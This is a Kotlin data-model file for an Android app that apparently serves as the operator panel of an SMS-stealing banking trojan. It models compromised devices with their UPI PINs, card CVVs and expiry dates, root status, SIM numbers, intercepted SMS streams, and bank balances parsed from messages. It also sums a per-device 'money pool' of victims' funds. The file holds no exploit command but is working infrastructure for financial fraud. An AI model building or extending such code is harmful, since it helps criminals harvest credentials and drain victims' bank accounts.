package com.zenin.app.data

import com.google.gson.annotations.SerializedName

// ─── Auth Models ─────────────────────────────────────────────────────────────

data class UserProfile(
    val userId: String = "",
    val name: String = "",
    val role: String = "",
    val tgUid: Long = 0L
)

data class SessionInfo(
    val id: Int = 0,
    val ip: String? = null,
    val userAgent: String? = null,
    val city: String? = null,
    val region: String? = null,
    val country: String? = null,
    val occurredAt: String = ""
) {
    val displayLocation: String get() = listOfNotNull(city, country).joinToString(", ").ifBlank { ip ?: "Unknown" }
}

sealed class LoginResult {
    data class OtpPending(val otpId: String) : LoginResult()
    data class Success(val token: String, val user: UserProfile, val loginEventId: Long) : LoginResult()
    data class CapacityFull(val sessions: List<SessionInfo>, val preAuthId: String) : LoginResult()
    data class Error(val message: String) : LoginResult()
}

sealed class OtpResult {
    data class Success(val token: String, val user: UserProfile, val loginEventId: Long) : OtpResult()
    data class CapacityFull(val sessions: List<SessionInfo>, val preAuthId: String) : OtpResult()
    data class Error(val message: String, val attemptsLeft: Int = 0) : OtpResult()
}

sealed class EvictResult {
    data class OtpPending(val otpId: String) : EvictResult()
    data class Success(val token: String, val user: UserProfile) : EvictResult()
    data class Error(val message: String) : EvictResult()
}

// ─── Device Models ────────────────────────────────────────────────────────────

data class SimCard(
    val phoneNumber: String = "",
    val carrierName: String = ""
)

data class BankBalance(
    val bankName: String = "",
    val senderName: String = "",
    val availableBalance: String = "",
    val transactionAmount: String? = null,
    val transactionType: String? = null,
    val accountLast4: String? = null
) {
    /** Parsed numeric balance (client-side, mirrors web parseRupee). */
    val amount: Double get() = parseRupee(availableBalance)
    val hasBalance: Boolean get() = availableBalance.isNotBlank()
}

data class CardInfo(
    val cardLast4: String = "",
    val cardType: String = "",
    val cvv: String? = null,
    val expiry: String? = null
)

data class SmsAnalysis(
    val bankBalances: List<BankBalance> = emptyList(),
    val cards: List<CardInfo> = emptyList(),
    val walletTransactions: List<WalletTx> = emptyList(),
    val phoneNumbers: List<String> = emptyList(),
    val networks: List<String> = emptyList()
) {
    val hasBank: Boolean get() = bankBalances.any { it.bankName.isNotBlank() }
    val hasCards: Boolean get() = cards.isNotEmpty()
    val hasWallet: Boolean get() = walletTransactions.isNotEmpty()

    /**
     * Device money pool — mirrors web computeBankBreakdown per device:
     * collapse to one entry per (bankName|last4) keeping the max balance,
     * then sum funded accounts (> 0).
     */
    val deviceTotal: Double get() {
        val accounts = HashMap<String, Double>()
        for (b in bankBalances) {
            val bankName = b.bankName.trim()
            if (bankName.isEmpty()) continue
            val key = "$bankName|${b.accountLast4 ?: ""}"
            val amount = if (b.hasBalance) b.amount else 0.0
            val cur = accounts[key] ?: 0.0
            if (amount > cur) accounts[key] = amount
            else if (!accounts.containsKey(key)) accounts[key] = 0.0
        }
        return accounts.values.filter { it > 0.0 }.sum()
    }

    /**
     * Display dedup — one row per canonical bank, keeping the highest balance,
     * mirrors web dedupeDeviceBanks. Sorted by balance descending.
     */
    val dedupedBanks: List<BankBalance> get() {
        val byBank = HashMap<String, Pair<BankBalance, Double>>()
        for (b in bankBalances) {
            val name = (b.bankName.ifBlank { b.senderName }).trim()
            if (name.isEmpty()) continue
            val key = name.uppercase()
            val amt = if (b.hasBalance) b.amount else 0.0
            val cur = byBank[key]
            if (cur == null || amt > cur.second) byBank[key] = b to amt
        }
        return byBank.values.sortedByDescending { it.second }.map { it.first }
    }
}

data class WalletTx(
    val provider: String = "",
    val amount: String = "",
    val type: String = ""
)

/** Parse a rupee string like "₹12,345.67" → 12345.67 (mirrors web parseRupee). */
fun parseRupee(v: String?): Double {
    if (v.isNullOrBlank()) return 0.0
    val cleaned = v.replace(Regex("[^0-9.]"), "")
    return cleaned.toDoubleOrNull() ?: 0.0
}

/** Format a rupee amount for display, mirrors web formatting. */
fun formatRupee(n: Double): String {
    if (n <= 0.0) return "₹0"
    return when {
        n >= 10_000_000 -> "₹${"%.2f".format(n / 10_000_000)}Cr"
        n >= 100_000 -> "₹${"%.2f".format(n / 100_000)}L"
        n >= 1_000 -> "₹${"%.1f".format(n / 1_000)}K"
        else -> "₹${n.toLong()}"
    }
}

data class Device(
    val id: String = "",
    val panelId: String = "",
    val name: String = "",
    val status: Boolean = false,
    val battery: Int? = null,
    val batteryRaw: String = "",
    val mobNo: String = "",
    val ipAddress: String = "",
    val androidV: String = "",
    val storage: String = "",
    val sdkV: String = "",
    val cpuArch: String = "",
    val isRoot: Boolean = false,
    val isSdCard: Boolean = false,
    val serviceProvider: String = "",
    val upiPin: String? = null,
    val note: String = "",
    val sims: List<SimCard> = emptyList(),
    val joined: String = "",
    val joinedTs: Long = 0L,
    val lastSeen: Long = 0L,
    val smsAnalysis: SmsAnalysis? = null
)

data class MoneyPoolSummary(
    val totalBalance: Double = 0.0,
    val fundCount: Int = 0,
    val unknownCount: Int = 0
)

// ─── SMS Models ───────────────────────────────────────────────────────────────

data class SmsMessage(
    val key: String = "",
    val message: String = "",
    val sender: String = "",
    val dateTime: String = "",
    val type: String = "incoming",
    val ts: Long = 0L
)

// ─── Settings / Panel Models ─────────────────────────────────────────────────

data class NotifySettings(
    val transaction: Boolean = false,
    val login: Boolean = false,
    val onlineOffline: Boolean = false,
    val enabledAt: Long? = null
)

data class PanelConfigInfo(
    val id: String = "",
    val name: String = "",
    val firebaseUrl: String = "",
    val isActive: Boolean = true,
    val createdAt: String = ""
)

// ─── SSE Event Models ─────────────────────────────────────────────────────────

sealed class SseEvent {
    data class DeviceUpdate(val panelId: String, val device: Device) : SseEvent()
    data class NewSms(val panelId: String, val deviceId: String, val messages: List<SmsMessage>) : SseEvent()
    data class Unknown(val type: String) : SseEvent()
}

// ─── Raw JSON response wrappers (for Gson parsing) ────────────────────────────

internal data class RawLoginResponse(
    val token: String? = null,
    val user: UserProfile? = null,
    val loginEventId: Long? = null,
    val otpPending: Boolean? = null,
    val otpId: String? = null,
    val error: String? = null,
    val activeSessions: List<SessionInfo>? = null,
    val preAuthId: String? = null,
    val attemptsLeft: Int? = null
)

internal data class RawDevicesResponse(
    val devices: List<Device> = emptyList(),
    val total: Int = 0,
    val summary: MoneyPoolSummary? = null
)

internal data class RawSmsResponse(
    val messages: List<SmsMessage> = emptyList(),
    val total: Int = 0
)

internal data class RawSessionsResponse(
    val sessions: List<SessionInfo> = emptyList()
)

internal data class RawUpiPinResponse(
    val pin: String? = null
)

internal data class RawMeResponse(
    val user: UserProfile? = null,
    val error: String? = null
)

internal data class RawNotifySettingsResponse(
    val settings: Map<String, NotifySettings>? = null
)

internal data class RawPanelConfigsResponse(
    val configs: List<PanelConfigInfo>? = null,
    val error: String? = null
)

internal data class RawShareLinkResponse(
    val token: String? = null,
    val error: String? = null
)

internal data class RawOkResponse(
    val ok: Boolean? = null,
    val error: String? = null,
    val deviceCount: Int? = null
)

internal data class RawSsePayload(
    val type: String = "",
    val panelId: String = "",
    val device: Device? = null,
    val deviceId: String = "",
    val messages: List<SmsMessage>? = null
)
